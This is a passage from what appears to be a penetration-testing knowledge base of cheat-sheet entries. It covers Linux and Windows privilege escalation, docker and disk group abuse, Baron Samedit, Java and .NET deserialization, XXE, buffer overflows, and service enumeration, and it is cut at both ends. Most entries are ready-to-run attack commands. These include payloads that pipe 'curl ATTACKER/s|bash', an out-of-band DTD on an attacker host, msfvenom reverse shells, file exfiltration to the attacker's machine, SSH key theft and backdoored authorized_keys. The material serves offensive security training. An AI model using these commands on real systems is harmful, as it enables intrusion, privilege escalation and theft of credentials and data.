- Blind? use an **oob-callbacks** command (curl/nslookup to your host) to confirm.
- Match the payload to what the loader expects (bytes vs base64 vs raw); see **deserialization-map**.

entries.title: docker group = root — mount the host and escape
entries.brief: A user in the docker group can run a container that mounts the host filesystem as root
entries.body:
## Why it's root-equivalent
The docker daemon runs as root. Anyone who can talk to it (member of the `docker` group, or with
access to `/var/run/docker.sock`) can start a container that **mounts the host's `/`** and read
or write anything — including dropping a SUID shell or editing /etc/passwd.

## Check
    id ; groups                       # 'docker' present?
    ls -l /var/run/docker.sock        # writable?
    docker ps                         # can you talk to the daemon?

## Escape (mount host root)
    docker run -v /:/mnt --rm -it alpine chroot /mnt sh
    # now you're root on the host fs; e.g.:
    #   cp /mnt/bin/bash /mnt/tmp/rootbash && chmod +s /mnt/tmp/rootbash
No local image? `docker images` for any existing one, or use `--privileged` on a running container.

## Related groups with similar power
- **lxd/lxc group** -> launch a privileged container mounting the host (see **lxd-privesc**).
- **disk group** -> raw read/write of the disk device (`debugfs /dev/sda1`).

## Gotchas
- Needs the daemon reachable (socket or group) — a plain container user is NOT in the group.
- No internet to pull an image? reuse any present image; `docker save`/offline images on exams.
- This is host root, so clean up test SUID binaries afterwards on real engagements.

entries.title: Baron Samedit (CVE-2021-3156) — sudo heap overflow to root
entries.brief: A heap overflow in sudoedit affecting sudo 1.8.2–1.9.5p1 gives local root on default configs
entries.body:
## What it is
CVE-2021-3156: a heap buffer overflow reachable via `sudoedit -s` with a trailing backslash.
It affects **sudo 1.8.2 through 1.9.5p1** and needs **no sudo rights** for the user — just a
vulnerable sudo binary. A very reliable local root on unpatched boxes (2011–2021).

## Check
    sudo --version        # or: sudoedit --version   (look for <= 1.9.5p1)
    # quick vuln test (vulnerable -> 'malloc(): ...' / segfault-ish; patched -> usage error):
    sudoedit -s '\' $(python3 -c 'print("A"*1000)')

## Exploit
    searchsploit baron samedit         # or clone blasty/CVE-2021-3156 / worawit's PoC
    make && ./sudo-hax-me-a-sandwich   # blasty PoC auto-detects the target
    # success -> root shell (id = uid=0)

## Why it's a go-to
Default sudo config, no sudoers entry required, present on a huge range of distros. Pairs with
**polkit-pwnkit** and **dirty-pipe** as the three 'try these first' modern local roots.

## Gotchas
- PoCs are distro/version specific (offsets) — pick the matching target or use an auto-detect PoC.
- Compile on the target (or match arch/glibc); a wrong build just crashes sudo harmlessly.
- Patched or out of range? fall back to config privesc (sudo -l, SUID, cron) and **kernel-exploits**.

entries.title: .NET deserialization — ViewState & ysoserial.net
entries.brief: Abuse __VIEWSTATE and other .NET serializers for RCE, often via a known/leaked machineKey
entries.body:
## The idea
ASP.NET `__VIEWSTATE` and formatters like BinaryFormatter/LosFormatter/ObjectStateFormatter
deserialize attacker data. If you can forge a valid ViewState (MAC off, or you know the
machineKey), **ysoserial.net** builds a gadget that runs commands server-side.

## Find the machineKey / MAC state
- EnableViewStateMac=false, or a leaked `web.config` with `<machineKey validationKey=... />`.
- Common defaults / disclosed keys (Telerik, orchard, sample apps) are worth trying.
- No MAC + no key = forge freely; MAC on = you need the validationKey+decryptionKey.

## Build the payload (ysoserial.net on Windows/mono)
    ysoserial.exe -p ViewState -g TypeConfuseDelegate -c 'ping ATTACKER' \
      --path='/app/page.aspx' --apppath='/' \
      --validationkey=KEY --validationalg=SHA1 [--decryptionkey=... --decryptionalg=AES]
    # paste the output as __VIEWSTATE (URL-encoded) in the POST

## Other .NET sinks
    ysoserial.exe -f BinaryFormatter -g WindowsIdentity -c 'cmd' -o base64
    # Json.NET (TypeNameHandling=All), LosFormatter, NetDataContractSerializer, etc.

## Gotchas
- Pick the gadget for the target .NET version; TypeConfuseDelegate/ActivitySurrogate are common.
- Blind -> ping/nslookup your host to confirm (see **oob-callbacks**).
- See atlas **ysoserial.net** and **deserialization-map** for the broader picture.

entries.title: Java deserialization — ysoserial gadget chains
entries.brief: Spot a Java serialized blob (ac ed 00 05) and turn it into RCE with ysoserial
entries.body:
## Spot it
A Java serialized object starts with magic bytes `AC ED 00 05` (base64 `rO0AB`). Look for it in
cookies, `ViewState`-like params, RMI (1099), JMX, T3 (WebLogic), or any `readObject()` on input.

## Pick a gadget chain
The chain depends on libraries on the server classpath:
    CommonsCollections1..7, CommonsBeanutils1, Spring1/2, Groovy1, URLDNS (detection only)
    # URLDNS first to CONFIRM deserialization without needing a code-exec gadget:
    java -jar ysoserial.jar URLDNS 'http://CANARY.oast.site' | base64

## Get RCE
    java -jar ysoserial.jar CommonsCollections5 'curl ATTACKER/s|bash' > payload.bin
    # deliver base64/raw into the readObject sink (cookie, body, RMI, etc.)
    # heavy filtering? tweak with the ysoserial 'GadgetProbe'/Burp Java Deserialization Scanner

## Common targets
- Apache Commons Collections apps, old JBoss/WebLogic/Jenkins CLI, T3/IIOP, JSF ViewState.

## Gotchas
- URLDNS proves the sink even when NO code-exec gadget is present — always start there.
- Match the chain to a library actually on the classpath (trial a few; GadgetProbe helps).
- See atlas **ysoserial** and **deserialization-map**.

entries.title: XXE escalation — file read to SSRF to RCE
entries.brief: Take a confirmed XXE past /etc/passwd: internal SSRF, PHP wrappers, and expect:// RCE
entries.body:
## Baseline (confirmed XXE)
    <!DOCTYPE r [ <!ENTITY x SYSTEM 'file:///etc/passwd'> ]> <r>&x;</r>
Files with XML-breaking chars? use a PHP base64 wrapper (below) or a CDATA/OOB exfil.

## Read awkward files (PHP targets)
    <!ENTITY x SYSTEM 'php://filter/convert.base64-encode/resource=/var/www/config.php'>
    # decode the base64 you get back

## Pivot to SSRF
    <!ENTITY x SYSTEM 'http://169.254.169.254/latest/meta-data/'>   # cloud creds
    <!ENTITY x SYSTEM 'http://127.0.0.1:8080/admin'>                # internal apps

## RCE paths
- **expect:// wrapper** (if PHP expect module loaded): `<!ENTITY x SYSTEM 'expect://id'>`.
- **SSRF -> internal service RCE** (Redis/Gopher): chain into **ssrf-advanced-gopher**.
- **Blind XXE** (no output): use an external DTD to exfil OOB — see **xxe-oob-blind**.

## Blind / OOB DTD skeleton
    <!ENTITY % d SYSTEM 'http://ATTACKER/evil.dtd'> %d;
    # evil.dtd reads a file and sends it to your listener via a parameter entity

## Gotchas
- DOCTYPE/entities stripped -> try parameter entities, UTF-16, or a nested/OOB DTD.
- expect:// is rarely enabled; file-read + SSRF is the usual real impact.
- See **xxe-logic** for detecting the sink first.

entries.title: Second-order SQL injection
entries.brief: Payload stored safely in one request fires later when a different query uses it unescaped
entries.body:
## The idea
Input is **stored** safely (parameterised on insert), then **re-used** in a later query that
concatenates it — so the injection fires in a different request/endpoint than where you entered
it. Classic spots: registration username, profile fields, that an admin page later queries.

## How to find it
1. Register/store a probe from sqli-logic, e.g. username `admin'-- -`, `' OR '1'='1`, or a `SLEEP`/`pg_sleep`.
2. Trigger the second action that reads it (login, profile view, password change, report).
3. Watch for errors/behaviour there, not on the store request.

## Example
    # signup stores:  user = tester'+(select pg_sleep(5))+'
    # later, an admin 'view users' page builds:  SELECT ... WHERE name='tester'+(...)+''
    # -> 5s delay when the admin page runs = blind second-order SQLi

## Exploit
Once located, it's ordinary SQLi (UNION/blind/time) — but sqlmap needs BOTH requests:
    sqlmap --second-url 'http://t/profile' -r store.req     # or --second-req

## Gotchas
- Parameterised INSERT does NOT protect a later string-concatenated SELECT — that's the whole bug.
- You often need an authenticated/privileged action to trigger the second query.
- Keep payloads short — stored fields have length limits. See **sqli-logic** / **blind-sqli**.

entries.title: SSH key reuse & loot — id_rsa, authorized_keys, agents
entries.brief: Found a private key or writable authorized_keys? turn it into access and lateral movement
entries.body:
## Hunt for keys after a foothold
    find / -name 'id_*' -o -name '*.pem' -o -name 'authorized_keys' 2>/dev/null
    ls -la ~/.ssh/ /home/*/.ssh/ /root/.ssh/ 2>/dev/null
    grep -rIl 'PRIVATE KEY' /home /var /opt 2>/dev/null

## Use a private key you find
    chmod 600 id_rsa
    ssh -i id_rsa user@host          # try the key's owner, and reuse across hosts
    ssh2john id_rsa > h ; john h     # passphrase-protected? crack it (see atlas: ssh2john)

## Write-access to authorized_keys = instant access
    echo 'ssh-ed25519 AAAA... me' >> /home/victim/.ssh/authorized_keys   # your pubkey
    ssh -i mykey victim@host
    # common when you have file-write as another user, or via a web upload to a home dir

## Agent & known_hosts pivoting
    ssh-add -l                       # hijack a forwarded agent (SSH_AUTH_SOCK) for onward auth
    cat ~/.ssh/known_hosts ~/.ssh/config   # map where this host SSHes to next

## Gotchas
- Keys get REUSED across boxes/users — always try a found key everywhere before cracking it.
- A key with no passphrase + a permissive authorized_keys is a direct root path if owned by root.
- Hashcat/john: use mode for the key type; old OpenSSH format differs from PEM.

entries.title: disk group — raw device read to root
entries.brief: Membership of the disk group gives raw access to block devices; read shadow or write files
entries.body:
## Why it's dangerous
The `disk` group owns the block devices (`/dev/sda*`). Raw access bypasses file permissions
entirely — you can read `/etc/shadow` out of the filesystem and even write to it with debugfs.

## Check
    id                               # 'disk' in your groups?
    ls -l /dev/sda*                  # group 'disk', mode brw-rw----

## Read any file (e.g. /etc/shadow)
    debugfs /dev/sda1
    debugfs: cat /etc/shadow         # dump root's hash -> crack it
    debugfs: cat /root/.ssh/id_rsa   # or steal root's key

## Write / escalate
    debugfs -w /dev/sda1
    debugfs: # edit a root-owned file (e.g. add a cron, replace a SUID) to execute as root
Then crack the shadow hash offline (hashcat -m 1800 for sha512crypt) or use the written payload.

## Related 'group = root' paths
- **docker/lxd group** -> mount host via a container (see **docker-group-privesc**).
- **adm group** -> read all logs (creds in logs); **video** -> framebuffer capture.

## Gotchas
- Find the right partition (`mount` / `lsblk`) — the root fs may not be sda1.
- Reading shadow needs no write; prefer cracking over editing the live disk (safer).

entries.title: SNMP write community — NET-SNMP extend to command exec
entries.brief: A writable (RW) SNMP community on net-snmpd can be abused to run commands as the daemon
entries.body:
## Find the community
    onesixtyone -c communities.txt TARGET      # brute community strings
    snmpwalk -v2c -c public TARGET             # read works? try common RW: private, manager
    snmpset -v2c -c private TARGET <oid> ...    # if a set succeeds, you have RW

## Abuse NET-SNMP 'extend' (run a command)
If the daemon is net-snmp and you have RW, create an extend entry that runs a command, then read
its output back — effectively RCE as the snmpd user (often root):
    snmpset -v2c -c private TARGET \
      'nsExtendStatus."x"' = createAndGo \
      'nsExtendCommand."x"' = /bin/bash \
      'nsExtendArgs."x"' = '-c "id > /tmp/o"'
    snmpwalk -v2c -c private TARGET nsExtendObjects   # trigger/read output

## Read-only community is still useful
    snmpwalk ... 1.3.6.1.2.1.25.4.2.1.2   # running processes (creds in cmdlines)
    snmpwalk ... 1.3.6.1.4.1.77.1.2.25    # Windows users ; .4.1.77.1.2.3.1.1 shares

## Gotchas
- `extend` abuse needs RW + net-snmp with the extend MIB; many agents don't expose it.
- Default/guessable communities (public/private) are the usual way in — brute first.
- See atlas **snmpwalk** / **snmp-check** / **onesixtyone**.

entries.title: File capabilities — cap_setuid to root
entries.brief: A binary with cap_setuid+ep (python/perl/ruby) can set uid 0 without being SUID
entries.body:
## The idea
Linux capabilities grant slices of root power to a binary without the SUID bit. `cap_setuid`
lets a program call `setuid(0)` — so an interpreter with that cap becomes a direct root shell.

## Find them
    getcap -r / 2>/dev/null          # list files with capabilities
    # dangerous: cap_setuid, cap_setgid, cap_dac_read_search, cap_dac_override (all +ep)

## Exploit cap_setuid (by interpreter)
    # python3 has cap_setuid+ep:
    /path/python3 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'
    # perl:
    /path/perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
    # ruby / node have equivalents

## Other high-value caps
- **cap_dac_read_search** -> read ANY file (e.g. /etc/shadow, root's key) — like disk-group read.
- **cap_dac_override** -> write files ignoring permissions.
- **cap_sys_admin / cap_sys_ptrace** -> broad; often container-escape relevant.

## Gotchas
- The cap must be effective (`+ep`); `getcap` shows the flags — `=ep` / `+ep` is live.
- GTFOBins lists the exact per-binary capability payloads — see **gtfobins-logic** / atlas **getcap**.
- `cap_setuid` on a non-interpreter binary may need its own exec path; interpreters are easiest.

entries.title: Windows stack buffer overflow — the OSCP workflow
entries.brief: The 6-step classic: fuzz, offset, control EIP, bad chars, jmp esp, shellcode
entries.body:
## Setup
Target app in Immunity Debugger (with mona) on a Windows VM; your Kali sends input. Reattach
(F3) and run (F9) the app after every crash. `!mona config -set workingfolder c:\mona\%p`.

## 1. Fuzz — find the crash
Send growing strings (e.g. +100 bytes) until the app dies and EIP looks overwritten.
    # simple python: s.send(b'A'*length + b'\r\n')

## 2. Offset — find EIP
    msf-pattern_create -l 3000                     # send this unique string
    !mona findmsp         # or: msf-pattern_offset -l 3000 -q <EIP value>
Confirm: send `A*offset + B*4 + C*rest` -> EIP must read `42424242`.

## 3. Bad characters
Send all bytes `\x01..\xff` in the buffer; compare in memory:
    !mona bytearray -b '\x00'        # generate, then
    !mona compare -f c:\mona\bytearray.bin -a <ESP addr>
Remove every mangled byte (always exclude \x00) and regenerate until clean.

## 4. Find a jump point (JMP ESP)
    !mona jmp -r esp -cpb '\x00\x0a'    # module without ASLR/DEP/rebase, no bad chars in addr
Use that address as EIP (little-endian). See atlas **nasm_shell** to confirm the `jmp esp` opcode.

## 5. Shellcode
    msfvenom -p windows/shell_reverse_tcp LHOST=.. LPORT=.. -f py -b '\x00\x0a..' EXITFUNC=thread
Layout: `A*offset + JMP_ESP + nops(\x90*16) + shellcode`. Start a listener, send, catch the shell.

## Gotchas
- Miss a bad char -> shellcode corrupts and the shell never lands. Re-verify step 3.
- Pick the JMP ESP from a module with NO ASLR/rebase and no bad bytes in the address.
- NOP sled before shellcode gives the decoder room; keep EXITFUNC=thread so the app survives.
- See **seh-overflow** when EIP isn't directly overwritten.

entries.title: Linux stack buffer overflow — gdb/gef basics
entries.brief: Control RIP/EIP on a Linux binary: offset, bad chars, and ret2libc when NX is on
entries.body:
## Triage the binary
    checksec --file=./vuln      # NX, ASLR(PIE), canary, RELRO (atlas: checksec)
    file ./vuln ; ./vuln $(python3 -c 'print("A"*200)')   # crash?

## Offset (gdb + gef/pwndbg)
    gdb ./vuln
    gef> pattern create 200       # run, feed it, then:
    gef> pattern offset $rsp      # (or $eip on 32-bit)

## No NX (classic): jump to shellcode on the stack
    msfvenom -p linux/x86/shell_reverse_tcp LHOST=.. LPORT=.. -f py -b '\x00'
    payload = b'A'*offset + p32(ret_to_stack) + nops + shellcode   # ret into your NOP sled

## NX enabled: ret2libc / ROP
    # leak/known libc: call system('/bin/sh')
    payload = b'A'*offset + p64(pop_rdi) + p64(binsh) + p64(system)
    ropper --file ./vuln --search 'pop rdi'      # find gadgets (atlas: ropper/ROPgadget)
pwntools makes this clean: `from pwn import *` (atlas: **pwntools**).

## Gotchas
- ASLR/PIE randomises addresses -> you need a leak, or disable for local practice
  (`echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`).
- 32-bit uses EIP + 4-byte addresses (p32); 64-bit uses RIP + gadgets for argument passing.
- Stack canary present -> you must leak/avoid it; see **rop-basics** if present.

entries.title: MSRPC / RPC enumeration (111, 135, 593)
entries.brief: Query the portmapper and MSRPC endpoints for users, shares, and services
entries.body:
## Unix RPC — portmapper (111/tcp)
    rpcinfo -p TARGET              # list registered RPC services (NFS, mountd, ...)
    showmount -e TARGET            # NFS exports (then mount; see weak-nfs-export)

## Windows MSRPC — endpoint mapper (135/tcp, 593 http)
    impacket-rpcdump TARGET        # enumerate RPC endpoints/interfaces
    rpcclient -U '' -N TARGET      # null session (anonymous)

## rpcclient — the useful queries
    enumdomusers        # domain users (-> spray/roast)
    enumdomgroups ; querygroupmem <rid>
    queryuser <rid>     # details for a user
    lsaquery ; lookupnames administrator ; lookupsids <sid>
    enumprinters ; srvinfo ; netshareenumall

## Gotchas
- Null/anonymous sessions are often disabled on modern Windows — try found creds with `-U u%p`.
- `lookupsids` RID-cycling finds users even when enumdomusers is blocked.
- 135 open + a login = impacket-wmiexec/dcomexec for exec (see those atlas entries).

entries.title: WinRM enumeration & access (5985 / 5986)
entries.brief: Check for WinRM, test creds, and drop into a shell with evil-winrm
entries.body:
## Spot it
    nmap -p 5985,5986 TARGET       # 5985 http, 5986 https
    # 5985/5986 open = WinRM; membership of 'Remote Management Users' or admin grants access

## Test credentials
    nxc winrm TARGET -u users.txt -p passwords.txt        # spray; (Pwn3d!) = you can log in
    nxc winrm TARGET -u user -H <NTLM-hash>                # pass-the-hash works over WinRM

## Get a shell
    evil-winrm -i TARGET -u user -p 'Pass'                 # password
    evil-winrm -i TARGET -u user -H <NTLM-hash>            # pass-the-hash
    evil-winrm -i TARGET -u user -c cert.pem -k key.pem    # certificate (ADCS/PKINIT)
evil-winrm niceties: `upload`/`download`, `menu`, and `-s` to load PowerShell scripts.

## Gotchas
- WinRM needs the account in Remote Management Users or local admin — a valid pw isn't enough alone.
- Prefer WinRM over psexec when available: quieter, full PowerShell, PtH-friendly.
- 5986 (HTTPS) may need `-S` in evil-winrm and accepting a self-signed cert.

entries.title: IPMI / BMC enumeration (623/udp)
entries.brief: Baseboard management controllers leak password hashes over IPMI 2.0 — dump and crack
entries.body:
## Spot it
    nmap -sU -p 623 --script ipmi-version TARGET     # BMC present (Dell iDRAC, HP iLO, Supermicro)

## Dump the hash (IPMI 2.0 RAKP flaw, CVE-2013-4786)
The protocol hands a password hash to any client during authentication — no creds needed:
    msf> use auxiliary/scanner/ipmi/ipmi_dumphashes
    # or: ipmitool ... ; output is a user + HMAC hash

## Crack it
    hashcat -m 7300 ipmi_hashes.txt rockyou.txt      # RAKP HMAC-SHA1

## Known default creds to try
    ADMIN/ADMIN (Supermicro), root/calvin (Dell iDRAC), admin/<blank> (HP iLO)

## Why it matters
A BMC is a tiny always-on computer beside the host with power/console control — owning it can mean
owning the server (mount virtual media, reset admin, KVM).

## Gotchas
- 623 is UDP — use `nmap -sU`; it's easy to miss in a default TCP scan.
- The hash dump works even on patched firmware if IPMI 2.0 RAKP is enabled (design flaw).

entries.title: X11 enumeration (6000-6009)
entries.brief: An open, unauthenticated X server lets you screenshot and read keystrokes remotely
entries.body:
## Spot it
    nmap -p 6000-6009 TARGET
    nmap -p 6000 --script x11-access TARGET      # 'X server access is granted' = open
    xdpyinfo -display TARGET:0                    # responds if open

## Capture the screen
    xwd -root -display TARGET:0 -out screen.xwd
    convert screen.xwd screen.png                # view what the user sees

## Log keystrokes
    xspy TARGET:0                                 # dump keystrokes (creds typed in!)
    # xdotool can also inject input to an open display

## Why it matters
'X server access granted' means no auth — you can watch the desktop and harvest typed passwords,
effectively a free keylogger/screen-capture.

## Gotchas
- Display number maps to port: :0 = 6000, :1 = 6001, etc.
- Most modern setups restrict with xauth/MIT-MAGIC-COOKIE; this hits misconfigured/legacy hosts.

entries.title: RDP enumeration & access (3389)
entries.brief: Fingerprint RDP, check NLA, test creds safely, and connect from Kali
entries.body:
## Spot & fingerprint
    nmap -p 3389 --script rdp-ntlm-info TARGET    # leaks hostname/domain/OS build!
    # rdp-ntlm-info is a great free source of the AD domain + FQDN

## Test credentials (mind lockout)
    nxc rdp TARGET -u users.txt -p passwords.txt      # (Pwn3d!) = valid login
    hydra -L users.txt -P pass.txt rdp://TARGET        # slower; watch lockout policy
    nxc rdp TARGET -u user -H <hash>                   # PtH works only if Restricted Admin on

## Connect from Kali
    xfreerdp /u:user /p:'Pass' /v:TARGET /cert:ignore +clipboard /dynamic-resolution
    xfreerdp /u:user /pth:<NTLM> /v:TARGET /cert:ignore     # pass-the-hash (Restricted Admin)
    # drive redirect for file transfer: /drive:share,/tmp

## Gotchas
- NLA on = you must send valid creds to even see the login; rdp-ntlm-info still leaks domain info.
- PtH over RDP needs 'Restricted Admin mode' enabled on the target, otherwise use the password.
- Account lockout: RDP brute is noisy — check `net accounts` policy first (see **active-directory-quick-wins**).

entries.title: Linux privesc — post-shell enumeration checklist
entries.brief: The ordered list to run right after a Linux shell, from quick wins to kernel
entries.body:
## Run the automated sweep first (then verify by hand)
    ./linpeas.sh | tee linpeas.out      # see atlas: linpeas
    pspy64                               # watch for cron/root processes (atlas: pspy)

## 0. Who/where am I
    id ; sudo -n true 2>/dev/null; hostname; uname -a; cat /etc/os-release

## 1. Quick wins (check these first — most boxes fall here)
    sudo -l                              # NOPASSWD / allowed commands -> GTFOBins
    find / -perm -4000 -type f 2>/dev/null   # SUID -> GTFOBins (see gtfobins-logic)
    getcap -r / 2>/dev/null              # capabilities (see capabilities-cap-setuid)
    cat /etc/crontab; ls -la /etc/cron.*     # writable cron (see cron-wildcard)

## 2. Creds & keys
    history; cat ~/.bash_history ~/.*_history 2>/dev/null
    find / -name 'id_*' -o -name '*.pem' 2>/dev/null   # (see ssh-key-reuse)
    grep -rIE 'password|secret|api[_-]?key' /var/www /opt /home 2>/dev/null
    cat /etc/passwd; ls -la /home/*

## 3. Services, sockets, internals
    ss -tlnp; netstat -tlnp              # internal-only ports -> pivot/port-forward
    ps auxww; ls -la /etc/systemd/system/    # writable unit/service? (see writable-service-binary)
    mount; cat /etc/fstab                # nfs/no_root_squash (see weak-nfs-export)

## 4. Groups & kernel (last resorts)
    id    # docker/lxd/disk/adm group? (see docker-group-privesc / disk-group-privesc)
    uname -r    # kernel exploit? pwnkit/dirtypipe/baron (see those) then LES (atlas)

## Gotchas
- Work top-down: a misconfig (sudo/SUID/cron) beats a kernel exploit — safer and more reliable.
- Don't trust linpeas alone; manually confirm the lead before you burn time on it.
- See **enumeration-checklist-windows** for the Windows counterpart.

entries.title: Windows privesc — post-shell enumeration checklist
entries.brief: The ordered list to run after a Windows shell: tokens, services, creds, then kernel
entries.body:
## Automated sweep first
    winpeas.exe > winpeas.txt            # atlas: winpeas
    powershell -ep bypass; . .\PowerUp.ps1; Invoke-AllChecks   # atlas: powerup
    Seatbelt.exe -group=all              # atlas: seatbelt

## 0. Context
    whoami /all                          # user, groups, and PRIVILEGES
    systeminfo ; hostname ; ipconfig /all

## 1. Token privileges (service accounts love these)
    whoami /priv    # SeImpersonate -> Potato ; SeBackup/SeRestore ; SeDebug
                    # (see token-impersonation-privs / windows-potato-attacks)

## 2. Services & tasks
    # unquoted path, weak service ACL, writable binary dir:
    accesschk.exe -uwcqv user *          # or PowerUp Get-ModifiableService
    schtasks /query /fo LIST /v          # writable task/script (see scheduled-task-privesc)
    # also: AlwaysInstallElevated (see that entry)

## 3. Credentials
    # unattend.xml, Winlogon autologon, cmdkey /list, GPP cPassword, PS history
    #   -> see windows-credential-hunting
    cmdkey /list ; reg query 'HKLM\...\Winlogon' /v DefaultPassword

## 4. Network / internal
    netstat -ano ; route print ; arp -a   # internal services -> pivot

## 5. Last resort — kernel
    systeminfo > si.txt  ->  wes.py si.txt --exploits-only   # atlas: wesng

## Gotchas
- `whoami /priv` is the single highest-value check on service accounts — look there first.
- Match Potato variant to the Windows build; JuicyPotato is dead on new builds.
- See **enumeration-checklist-linux** for the Linux counterpart.

entries.title: File transfer cheat-sheet — on and off any target
entries.brief: Every reliable way to move files to/from Linux and Windows targets
entries.body:
## Serve files from Kali
    python3 -m http.server 80            # HTTP
    impacket-smbserver share . -smb2support [-user u -password p]   # SMB (Windows-friendly)
    updog -p 80                          # HTTP with upload (atlas: updog)
    nc -lvnp 443 > out.bin               # raw catch

## Download onto Linux target
    wget http://KALI/f -O /tmp/f ; curl http://KALI/f -o /tmp/f
    scp user@KALI:/f .   ;   nc KALI 443 < f   (sender)  /  nc -lvnp 443 > f (receiver)

## Download onto Windows target
    certutil -urlcache -split -f http://KALI/f f.exe        # classic, often AV-flagged
    powershell IWR http://KALI/f -OutFile f.exe             # or (New-Object Net.WebClient).DownloadFile(..)
    powershell Invoke-WebRequest http://KALI/f -OutFile f   # curl.exe on modern Windows also works
    copy \\KALI\share\f.exe .                               # from impacket-smbserver

## Exfil off the target
    # Linux: curl -F 'f=@/etc/passwd' http://KALI/  (updog) ; or nc
    # Windows: powershell (New-Object Net.WebClient).UploadFile('http://KALI/','f')
    # SMB both ways: copy to/from the mounted \\KALI\share

## No tools? LOLBAS / fallback
    base64 a file, paste over your shell, base64 -d on the other side  (small files)
    bitsadmin /transfer j http://KALI/f %cd%\f   # legacy Windows

## Gotchas
- SMB2support is required for modern Windows to talk to impacket-smbserver.
- certutil/bitsadmin are heavily signatured; prefer powershell IWR or SMB copy if AV bites.
- Verify integrity on big transfers (md5sum/Get-FileHash); see **windows-file-transfer**.

entries.title: Weak service permissions — binary/ACL to SYSTEM
entries.brief: A service you can reconfigure or whose binary you can overwrite runs your code as SYSTEM
entries.body:
## The idea
Windows services usually run as SYSTEM. If your user can change a service's config, overwrite its
executable, or edit its registry key, you get SYSTEM when it (re)starts.

## Find the weakness
    accesschk.exe -uwcqv <user> *                 # services you can modify (SERVICE_CHANGE_CONFIG)
    accesschk.exe -quvw "C:\Path\service.exe"      # can you overwrite the binary?
    PowerUp: Get-ModifiableService / Get-ServiceUnquoted / Get-ModifiableServiceFile
    sc qc <svc>                                   # see BINARY_PATH_NAME + start type

## Abuse A — reconfigure the service binpath
    sc config <svc> binpath= "cmd /c net localgroup administrators user /add"
    sc stop <svc> & sc start <svc>                # runs your command as SYSTEM
    # restore binpath afterward on real engagements

## Abuse B — overwrite a writable service binary
    copy evil.exe "C:\Path\service.exe"           # msfvenom service exe, then restart

## Can't restart? check start type
    # if you can't stop/start, a reboot or an auto-start trigger runs it; or chain another privesc

## Gotchas
- Need the service to actually (re)start — SERVICE_START right or a reboot; `sc qc` shows start type.
- Unquoted service path is a related bug (see **unquoted-service-path**).
- A msfvenom 'exe-service' payload survives SCM start/stop better than a plain exe.

entries.title: Scheduled task privesc — writable task script/binary
entries.brief: A privileged scheduled task that runs a file you can modify = code exec as that user
entries.body:
## Find tasks + what they run
    schtasks /query /fo LIST /v                   # all tasks, run-as user, action path
    schtasks /query /fo LIST /v | findstr /i "TaskName Run As Task To Run"
    # look for tasks running as SYSTEM/admin that execute a script or exe

## Check you can write the target
    accesschk.exe -quvw "C:\Scripts\backup.ps1"    # writable by you?
    icacls "C:\Scripts\backup.ps1"                 # (M)/(F) for your user/group

## Exploit — overwrite the task's payload
    echo net localgroup administrators user /add >> C:\Scripts\backup.ps1   # or replace it
    # wait for the schedule, or if you can: schtasks /run /tn "TaskName"

## Also check task binary dir on PATH
If the task calls a bare binary (no full path) and you can write a dir earlier on its PATH, that's
a PATH hijack — see **path-hijack**.

## Gotchas
- You need write to the script/exe OR its folder; `icacls`/accesschk confirms it.
- Can't trigger it? note the schedule and wait, or chain with another foothold.
- winPEAS/PowerUp flag modifiable scheduled tasks automatically.

entries.title: Elasticsearch — enumeration, data loot, and known RCE
entries.brief: Query an open Elasticsearch (9200) for data, and leverage legacy CVEs for RCE
entries.body:
## Spot & enumerate (9200/tcp, HTTP/JSON)
    curl -s http://TARGET:9200/                   # version banner
    curl -s http://TARGET:9200/_cat/indices?v     # list indices (data stores)
    curl -s 'http://TARGET:9200/_search?pretty&size=100'   # dump documents (creds/PII often here)
    curl -s http://TARGET:9200/INDEX/_search?pretty

## Data is the usual win
Open Elasticsearch frequently holds app data, logs with tokens, or user records — loot it and
reuse creds elsewhere before chasing RCE.

## Known RCE (legacy versions)
- **CVE-2014-3120** (ES < 1.2, dynamic scripting MVEL): script execution via _search.
- **CVE-2015-1427** (ES < 1.3.8 / 1.4.3, Groovy sandbox bypass): Groovy script RCE.
    searchsploit elasticsearch        # pick the PoC matching the banner version

## Gotchas
- Check the version from `/` first — the RCEs only hit old 1.x builds; modern ES needs auth.
- No RCE? the data dump alone (creds/tokens) usually opens the next door.
- Kibana (5601) sometimes sits alongside and has its own CVEs.

entries.title: VNC enumeration & access (5800/5900+)
entries.brief: Find VNC, test for no-auth or weak passwords, and decrypt stored VNC passwords
entries.body:
## Spot it
    nmap -p 5900-5906 --script vnc-info,vnc-title,realvnc-auth-bypass TARGET
    # 5900 = display :0, 5901 = :1 ... ; 5800 = VNC-over-HTTP (Java viewer)

## Connect / test auth
    vncviewer TARGET:5900                 # no-auth servers drop you straight in
    hydra -P pass.txt vnc://TARGET        # brute the (single) VNC password

## Decrypt a stored VNC password
VNC passwords are stored with a FIXED DES key — trivially reversible when you loot the file/registry:
    # files: ~/.vnc/passwd, UltraVNC.ini ; registry: ...\\WinVNC\\Password
    msf> use auxiliary/analyze/vnc_password   # or the known 'vncpwd' tool

## Why it matters
A VNC session is an interactive desktop as the logged-in user — instant GUI access, often to a
privileged session.

## Gotchas
- VNC auth is password-only (no username); default 8-char password truncation makes brute easy.
- realvnc-auth-bypass (CVE-2006-2369) gives no-auth access to old RealVNC 4.1.x.
- Found a `passwd` blob? decrypt it rather than brute — the key is public.

entries.title: Password-reset & auth logic flaws
entries.brief: Token predictability, host-header poisoning, response leaks and reset-to-takeover
entries.body:
## Where resets break
The reset flow is a rich source of account takeover. Test each step:

## 1. Token weakness
- Predictable/sequential tokens, short tokens, or tokens = base64(email|timestamp).
- Token not invalidated after use / no expiry / reusable across accounts.
- Token leaked in the HTTP response, Referer header, or URL to third-party scripts.

## 2. Host header poisoning
If the reset email's link is built from the Host header, point it at your server and capture the
victim's token when the link is generated — see **host-header-injection**.

## 3. Parameter / response abuse
    # send the reset for victim, but add your email:
    email=victim@corp.com&email=me@evil.com      # second param wins -> link to you
    # or an array: email[]=victim&email[]=me
    # watch the response: some apps return the token or new password in JSON

## 4. Flow bypass
- Skip the 'old password' check by removing the field, or change another user's password via IDOR
  on a userid parameter (see **idor** notes).
- OTP/2FA: no rate limit -> brute the 4-6 digit code.

## Gotchas
- Always try the mass-assignment / duplicate-parameter trick on the reset-request endpoint.
- Compare the token across two resets for the same user — static/predictable = broken.
- Confirm blind host-header use with an **oob-callbacks** canary.

entries.title: SMTP enumeration (25 / 465 / 587)
entries.brief: User enumeration via VRFY/EXPN/RCPT, banner grab, and open-relay testing
entries.body:
## Banner + capabilities
